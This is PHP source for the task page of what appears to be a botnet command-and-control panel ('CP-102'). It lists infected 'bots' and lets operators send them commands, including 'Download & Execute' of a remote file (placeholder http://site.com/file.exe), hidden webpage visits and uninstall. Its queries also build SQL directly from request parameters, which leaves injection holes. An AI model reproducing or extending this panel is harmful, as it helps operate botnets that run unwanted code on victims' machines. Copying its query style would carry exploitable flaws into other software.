<?php
require 'db.php';
include ('db.php');

include 'include/geo/geoip.inc';
$gi = geoip_open("include/geo/GeoIP.dat", "");

ob_end_clean();
ob_start();

$expire = 365*24*3600;
ini_set('session.gc_maxlifetime', $expire);
session_start();

$taskstot = '';

// Check if user is logged in using the session variable
if(empty($_SESSION["logged_in"])){
    if(empty($_SESSION["user"])){
        header("location: error.php");
    }else{
        setcookie(session_name(),session_id(),0);
        // Makes it easier to read
        $user = $_SESSION['user'];
        $active = $_SESSION['active'];
        }
}
else
{
    setcookie(session_name(),session_id(),time()+$expire);
    // Makes it easier to read
    $user = $_SESSION['user'];
    $active = $_SESSION['active'];
}

$bootstrapalert = '';

if($_GET && isset($_GET['rem'])){
    $taskt = $_GET['rem'];
    $taskid = "";
    if ($taskname = $mysqli->query( "SELECT Task FROM task WHERE id='$taskt'"))
    {
            if($taskname->num_rows === 0){
               
            }else{
                    while ($row2 = $taskname->fetch_assoc()) {

                        $taskid = $row2['Task'];
                       
                    }
                }        
    }else{
    die($mysqli->error);
    }


    $sql = "DELETE FROM task WHERE id='$taskt'";
    if ($mysqli->query($sql) === TRUE) {
    $query = $mysqli->query("UPDATE bots SET cmd='' WHERE cmd='$taskid'") or die("Error" .$mysqli->error);
    $query = $mysqli->query("INSERT INTO logs (username, ipaddress, action, date) VALUES ('".$_SESSION['user']."','".$_SERVER['REMOTE_ADDR']."', CONCAT('Removed task ''', '".$taskid."' ,''''),'".time()."');") or die("Error" .$mysqli->error);
    
$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> Task removed... Redirecting ...
</div>
btalert;
header( "refresh:3; url=task.php" );  
    } else {
        $mysqlerror = $mysqli->error;
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  $mysqlerror.
</div>
btalert;
    }
}

if($_POST && isset($_POST['execs'])){

    $creator = $_SESSION['user'];

    if($_POST['task'] === "1"){
        $task = "Download & Execute";
    }
    if($_POST['task'] === "2"){
        $task = "Visit WebPage(Visible)";
    }
    if($_POST['task'] === "3"){
        $task = "Visit WebPage(Hidden)";
    }
    if($_POST['task'] === "4"){
        $task = "Restart";
    }
    if($_POST['task'] === "5"){
        $task = "Close";
    }
    if($_POST['task'] === "6"){
        $task = "Uninstall";
    }


    $sql = "SELECT * FROM task WHERE Task='$task'";
    if($result = $mysqli->query($sql)){

        if($result->num_rows === 0){
            if($_POST['params'] === ""){
                $parameters = "-";
            }else{
                $parameters = $_POST['params'];
            }
            $datecreated = date("Y-m-d H:i:s");
            if ($_POST['execs'] === ""){
                $executions = "All";
            }else{
                $executions = $_POST['execs'];
            }
            $sql = "INSERT INTO task (Creator,Task,Parameters,Executions,Data_Created,Status,Executedon) VALUES ('$creator','$task','$parameters','$executions','$datecreated','Running','0')";
            $query = $mysqli->query("INSERT INTO logs (username, ipaddress, action, date) VALUES ('".$_SESSION['user']."','".$_SERVER['REMOTE_ADDR']."', CONCAT('New task ''', '".$task."' ,''' created'),'".time()."');") or die("Error" .$mysqli->error);
            
            if($mysqli->query($sql)){
$bootstrapalert = <<<btalert
<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> New task added... Redirecting ...
</div>
btalert;
        header( "refresh:3; url=task.php" );  
            }else{
        $mysqlerror = $mysqli->error;
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  $mysqlerror.
</div>
btalert;
            }
}
                
else{
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  Task already exists, delete pre existing task to create a similar one.
</div>
btalert;

            }
        }
}

// Format Bytes
function convertToReadableSize($size){
  $base = log($size) / log(1024);
  $suffix = array(" B", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}


// Bots Query
$totalbotsindb = 0;
if ($bots_new = $mysqli->query("SELECT * FROM bots"))
        {
                if($bots_new->num_rows === 0){
                   
                }else{
                        while ($row = $bots_new->fetch_assoc()) {

                            $totalbotsindb = $bots_new->num_rows;
                           
                        }
                    }        
}else{
	die($mysqli->error);
}
    

$tasktemplate = '<tr>
<td colspan="1" align="center" class="td_c3">#taskid_row</td>
<td colspan="1" align="center" class="td_c3">#creator_row</td>
<td colspan="1" align="center" class="td_c3" >#task_row</td>
<td colspan="1" align="center" class="td_c3">#parameters_row</td>
<td colspan="1" align="left" class="td_c3">#execs_row</td>
<td colspan="1" align="center" class="td_c3">#creation_row</td>
<td colspan="1" align="center" class="td_c3">#status_row</td>
<td colspan="1" align="center" class="td_c3">#runningon_row</td>
<td data-id="#idl"><center>
        <a href="#myModal" role="button" data-toggle="modal" ><i class="fa fa-trash-o"></i></a>
        </center>
    </td>
</tr>
';

if ($tasks = $mysqli->query("SELECT * FROM task"))
        {
                if($tasks->num_rows === 0){
                   //REM
                }else{
                        while ($row = $tasks->fetch_assoc()) {

                                $taskstot .= str_replace("#idl",$row['id'],$tasktemplate);
                                $taskstot = str_replace("#taskid_row",$row['id'],$taskstot);
                                $taskstot = str_replace("#creator_row",$row['Creator'],$taskstot);
                                $taskstot = str_replace("#task_row",$row['Task'],$taskstot);
                                $cycletask = $row['Task'];
                                $stat = $row['Status'];
                                $taskstot = str_replace("#parameters_row",$row['Parameters'],$taskstot);
                                $taskstot = str_replace("#execs_row",$row['Executions'],$taskstot);
                                $taskstot = str_replace("#creation_row",$row['Data_Created'],$taskstot);
                                

                                $nowrunning = 0;
                                if ($tasks1 = $mysqli->query("SELECT cmd FROM bots"))
                                {
                                        if($tasks1->num_rows === 0){
                                            //REM
                                        }else{
                                                while ($row1 = $tasks1->fetch_assoc()) {
                                                        if ($row1['cmd'] ===  $cycletask){
                                                            $nowrunning = $nowrunning + 1;
                                                        }
                                                    }                                                   
                                                }
                                }

                                if ($row['Executedon'] === ""){
                                    $executedon = "0";
                                }else{
                                    $executedon = $row['Executedon'];
                                }
                                $taskstot = str_replace("#runningon_row",$executedon."/".$totalbotsindb,$taskstot);


                                if ( $nowrunning == $totalbotsindb){
                                    $taskstot = str_replace("#status_row","Completed",$taskstot);
                                    $query3 = $mysqli->query("UPDATE task SET Status='Completed' WHERE Task='$cycletask'") or die("Error" .$mysqli->error);                            
                                }else{

                                    $taskstot = str_replace("#status_row",$stat,$taskstot);
                                }  
                                
                                
                            }
                           
                        }
}

$sql = "SELECT lastactivity,showbots FROM accounts WHERE user = '$user'";
$result = $mysqli->query($sql);
if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
        $lastactivity = $row['lastactivity'];
        $showbots = $row['showbots'];
	}
} else {
    die($mysqli->error);
}
if ($showbots === "True"){
    $showbotsnotify = '<span class="label label-info">+'.$totalbotsindb.'</span>';
}else{
    $showbotsnotify = "";
}

// Page
$variable = <<<Bdy
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>Task List</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="lib/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.css">

    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />

    
    <script src="lib/jquery-1.11.1.min.js" type="text/javascript"></script>
    <script>
    function sortTable(n) {
      var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
      table = document.getElementById("myTable");
      switching = true;
      //Set the sorting direction to ascending:
      dir = "asc"; 
      /*Make a loop that will continue until
      no switching has been done:*/
      while (switching) {
        //start by saying: no switching is done:
        switching = false;
        rows = table.getElementsByTagName("TR");
        /*Loop through all table rows (except the
        first, which contains table headers):*/
        for (i = 1; i < (rows.length - 1); i++) {
          //start by saying there should be no switching:
          shouldSwitch = false;
          /*Get the two elements you want to compare,
          one from current row and one from the next:*/
          x = rows[i].getElementsByTagName("TD")[n];
          y = rows[i + 1].getElementsByTagName("TD")[n];
          /*check if the two rows should switch place,
          based on the direction, asc or desc:*/
          if (dir == "asc") {
            if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch= true;
              break;
            }
          } else if (dir == "desc") {
            if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch = true;
              break;
            }
          }
        }
        if (shouldSwitch) {
          /*If a switch has been marked, make the switch
          and mark that a switch has been done:*/
          rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
          switching = true;
          //Each time a switch is done, increase this count by 1:
          switchcount ++;      
        } else {
          /*If no switching has been done AND the direction is "asc",
          set the direction to "desc" and run the while loop again.*/
          if (switchcount == 0 && dir == "asc") {
            dir = "desc";
            switching = true;
          }
        }
      }
    }
    </script>
        <script src="lib/jQuery-Knob/js/jquery.knob.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function() {
            $(".knob").knob();
        });
    </script>


    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">
    <script src="https://www.w3schools.com/lib/w3.js"></script>
</head>
<body class=" theme-blue">

    <script type="text/javascript">
        $(function() {
            var match = document.cookie.match(new RegExp('color=([^;]+)'));
            if(match) var color = match[1];
            if(color) {
                $('body').removeClass(function (index, css) {
                    return (css.match (/\btheme-\S+/g) || []).join(' ')
                })
                $('body').addClass('theme-' + color);
            }

            $('[data-popover="true"]').popover({html: true});
            
        });
    </script>
    <style type="text/css">
        #line-chart {
            height:300px;
            width:800px;
            margin: 0px auto;
            margin-top: 1em;
        }
        .navbar-default .navbar-brand, .navbar-default .navbar-brand:hover { 
            color: #fff;
        }
    </style>

    <script type="text/javascript">
        $(function() {
            var uls = $('.sidebar-nav > ul > *').clone();
            uls.addClass('visible-xs');
            $('#main-menu').append(uls.clone());
        });
    </script>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="../assets/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/ico/apple-touch-icon-57-precomposed.png">
  

  <!--[if lt IE 7 ]> <body class="ie ie6"> <![endif]-->
  <!--[if IE 7 ]> <body class="ie ie7 "> <![endif]-->
  <!--[if IE 8 ]> <body class="ie ie8 "> <![endif]-->
  <!--[if IE 9 ]> <body class="ie ie9 "> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> 
   
  <!--<![endif]-->

  <div class="navbar navbar-default" role="navigation">
  <div class="navbar-header">
    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="" href="cp.php"><span class="navbar-brand">CP-102</span></a></div>

  <div class="navbar-collapse collapse" style="height: 1px;">
    <ul id="main-menu" class="nav navbar-nav navbar-right">
      <li class="dropdown hidden-xs">
          <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <span class="glyphicon glyphicon-user padding-right-small" style="position:relative;top: 3px;"></span> $user
              <i class="fa fa-caret-down"></i>
          </a>

        <ul class="dropdown-menu">
          <li><a href="myaccount.php">My Account</a></li>
          <li class="divider"></li>
          <li class="dropdown-header">Control Panel</li>
          <li><a href="users.php">Users</a></li>
          <li class="divider"></li>
          <li><a tabindex="-1" href="logout.php">Logout</a></li>
        </ul>
      </li>
    </ul>

  </div>
</div>
</div>
    

    <div class="sidebar-nav">
    <ul>
    <li><a href="#" data-target=".dashboard-menu" class="nav-header" data-toggle="collapse"><i class="fa fa-fw fa-dashboard"></i> Dashboard$showbotsnotify<i class="fa fa-collapse"></i></a></li>
    <li><ul class="dashboard-menu nav nav-list collapse in">
            <li><a href="cp.php"><span class="fa fa-caret-right"></span> Main</a></li>
            <li><a href="list.php" ><span class="fa fa-caret-right"></span> Bots</a></li>
            <li  class="active"><a href="task.php"><span class="fa fa-caret-right"></span> Tasks</a></li>
            <li ><a href="users.php"><span class="fa fa-caret-right"></span> User List</a></li>
    </ul></li>
    <ul>
    <li><a href="#" data-target=".legal-menu" class="nav-header collapsed" data-toggle="collapse"><i class="fa fa-fw fa-cog"></i> Settings<i class="fa fa-collapse"></i></a></li>
    <li><ul class="legal-menu nav nav-list collapse">
        <li ><a href="set.php"><span class="fa fa-caret-right"></span> Optimization</a></li>
        <li ><a href="logs.php"><span class="fa fa-caret-right"></span> System Logs</a></li>
</ul></li>
    </div>

    <div class="content">
        <div class="header">
            <div class="stats">

</div>

            <h1 class="page-title">Current Tasks</h1>
                    

        </div>
        <div class="main-content">
        $bootstrapalert
            <script>
            function check_all() {
                var checkboxes = document.getElementsByName('check');
                checkboxes = [...checkboxes];
                for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = true
                }
              }
              function un_check_all() {
                var checkboxes = document.getElementsByName('check');
                checkboxes = [...checkboxes];
                for (var i = 0; i < checkboxes.length; i++) {
                  checkboxes[i].checked = false;
                }
              }
            </script>

            <div style="margin-top:10px">
            <table id="botlist" class="table table-condensed table-hover table-striped table-bordered">
                <thead>
                    <tr>
                        <th class="point" onclick="sortTable(0)">#</th>
                        <th class="point" onclick="sortTable(1)">Creator</th>
                        <th class="point" onclick="sortTable(2)">Task</th>
                        <th class="point" onclick="sortTable(3)">Parameters</th>
                        <th class="point" onclick="sortTable(4)">Executions</th>
                        <th class="point" onclick="sortTable(5)">Creation Date</th>   
                        <th class="point" onclick="sortTable(6)">Status</th>
                        <th class="point" onclick="sortTable(7)">Executed On</th>
                        <th class="point" onclick="sortTable(8)">Actions</th>
                    </tr>
              </thead>
              <tbody>
 
              $taskstot

              </tbody>
            </table>
            </div>
            <hr>
            <div class="row">
                <div class="col-sm-12 col-md-12">
                    <div class="panel panel-default">
                        <div class="panel-heading no-collapse">New Task<span class="label label-warning"></span></div>
                                
								
								<br>
								<form action="task.php" method="POST" class="col-lg-8">
									<label>Task Type</label>
									<select name="task" class="form-control">
										<optgroup label="Downloads">
											<option value="1">Download & Execute</option>
										</optgroup>
										<optgroup label="Webpages">
                                            <option value="2">Visit WebPage(Visible)</option>
                                            <option value="3">Visit WebPage(Hidden)</option>
										</optgroup>
										<optgroup label="Session">
                                            <option value="4">Restart Session</option>
                                            <option value="5">Close Session</option>
                                            <option value="6">Uninstall Session</option>
                                        </optgroup>
								
									</select>
									<br>
									<label>Parameters</label>
									<input type="text" class="form-control" name="params" placeholder="Ex: http://site.com/file.exe">
									<br>
									
									<label>Number of Executions</label>
									<input type="text" class="form-control" name="execs" placeholder="Leave blank for unlimited">
									<br>
									<input type="submit" class="btn btn-success" name="addTask" value="Add New Task" style="margin-bottom:10px">   
								</form>
                                <div class="clearfix"></div>
                                
					</div>
				</div>                            
            </div>
        </div>



    <script src="lib/bootstrap/js/bootstrap.js"></script>


	<div class="modal small fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:9999;">
            <div class="modal-dialog">
              <div class="modal-content">
                  <div class="modal-header">
                      <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                      <h3 id="myModalLabel">Delete Confirmation</h3>
                  </div>
                  <div id="orderDetails" class="modal-body"></div>
                  <div id="orderItems" class="modal-body"></div>

                  <div id="compose" class="modal-footer"></div>
                </div>
              </div>
          </div>

        <script>
        $(function () {
        $('#orderModal').modal({
            keyboard: true,
            backdrop: "static",
            show: false,
    
        }).on('show', function () {
    
        });
    
        $(".table").find('td[data-id]').on('click', function () {

            $('#orderDetails').html($('<p class="error-text"><i class="fa fa-warning modal-icon"></i>Are you sure you want to delete this task?</p>'));
            $('#compose').html($('<button class="btn btn-default" data-dismiss="modal" aria-hidden="true">Cancel</button>' + '<button class="btn btn-danger" onclick="location.href=' + "'task.php?rem=" + $(this).data('id') + "'" + '"' + ' data-dismiss="modal" id="execute" style="background-color:#FF2424!important"> Delete</button>'));
            $('#myModal').modal('show');
    
    
    
        });
    
    });

      </script>
    
</body></html>


</body>
</html>
Bdy;
echo $variable;  

    

?>